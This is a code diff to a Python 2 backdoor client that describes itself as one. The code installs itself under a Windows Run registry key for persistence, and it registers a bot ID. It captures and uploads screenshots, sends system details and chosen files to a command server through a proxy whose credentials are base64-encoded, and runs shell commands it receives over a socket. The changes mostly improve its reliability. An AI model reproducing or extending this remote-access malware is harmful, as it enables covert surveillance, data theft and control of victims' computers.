@@ -44,7 +44,7 @@ def persistence():
     if not os.path.exists(destination):
         shutil.copyfile(path + '\clipbrd.exe', destination)
         # This is one of the keys that allows to run on startup , others can be found using
-        # sysinternals tools and other methods like googling
+        # sysinternals tools and googling
         key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                            0, wreg.KEY_ALL_ACCESS)
         # Hacked is the key name that will run our backdoor on startup
@@ -53,12 +53,27 @@ def persistence():
 
 
 def sendGet(Url):
-    response = requests.get(url=Url, proxies=proxy)
+    try:
+        response = requests.get(url=Url, proxies=proxy)
+    except Exception as e:
+        return str(e)
     return response
 
 
 def sendPost(Url, data, files=None):
-    response = requests.post(url=Url, data=data, proxies=proxy)
+    try:
+        response = requests.post(url=Url, data=data, proxies=proxy)
+    except Exception as e:
+        return str(e)
+    return response
+
+
+def sendFile(files=None):
+    try:
+        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={
+        'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
+    except Exception as e:
+        return str(e)
     return response
 
 
@@ -94,17 +109,11 @@ def screenshot():
     dirpath = tempfile.mkdtemp()
     now = str(datetime.now()).replace(" ", "_")
     now = now.replace(":", "_")
-    ImageGrab.grab().save(dirpath + now + "\img.jpg", "JPEG")
-    files = {'fileToUpload': open(dirpath + now + "\img.jpg", 'rb')}
+    ImageGrab.grab().save(dirpath + "\\" + now + "-img.jpg", "JPEG")
+    files = {'fileToUpload': open(dirpath + "\\" + now + "-img.jpg", 'rb')}
     r = sendFile(files)
     files['fileToUpload'].close()
     shutil.rmtree(dirpath)
-
-
-def sendFile(files=None):
-    response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={
-        'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
-    return response
 
 
 def search(command):
@@ -122,18 +131,37 @@ def search(command):
     res = sendPost(uploadURL, data=listOfFiles)
 
 
-def initialize():
-    persistence()
+def identity():
     global identification
     identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
     dirpath = tempfile.mkdtemp()
     files = open(dirpath + '\identity.txt', 'wb')
     files.write(json.dumps(identification))
     files.close()
-    files = {'fileToUpload': open(dirpath + '\identity.txt', 'rb')}
-    r = sendFile(files)
-    files['file'].close()
-    shutil.rmtree(dirpath)
+    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
+                       0, wreg.KEY_WRITE)
+    # Botname is the key name that will stop identity to be sent on each startup
+    wreg.SetValueEx(key, 'botID', 0, wreg.REG_SZ, botname)
+    key.Close()
+    return dirpath
+
+
+def initialize():
+    persistence()
+    # create identity only if earlier identity doesn't exist , which is to be checked with registry
+    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
+                       0, wreg.KEY_QUERY_VALUE)
+    # Enumerate the value of bot to determine whether we need to send identification to server or not
+    try:
+        bot = wreg.QueryValueEx(key, 'botID')
+    except WindowsError:
+        print key
+        dirpath = identity()
+        files = {'fileToUpload': open(dirpath + '\identity.txt', 'rb')}
+        r = sendFile(files)
+        files['fileToUpload'].close()
+        shutil.rmtree(dirpath)
+    key.Close()
 
 
 initialize()
@@ -161,18 +189,23 @@ def connect():
         elif 'sendToServer' in command:
             grab, path = command.split('*')
             if os.path.exists(path):
-                files = {'file': open(path, 'rb')}
+                files = {'fileToUpload': open(path, 'rb')}
                 r = sendFile(files)
             else:
                 r = sendPost(uploadURL, data='[-]File Not Found')
+            print "File Uploaded"
+            s.send('DONE')
 
         elif 'screencap' in command:
             screenshot()
+            s.send('DONE')
 
         elif 'cd' in command:
-            code, directory = command.split(',')
+            code, directory = command.split(' ',
+                                            1)  # Added maxsplit value as some folders may contain whitespaces like "Program Files"
             os.chdir(directory)
             s.send("[+] CWD is " + os.getcwd())
+            s.send('DONE')
 
         else:
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
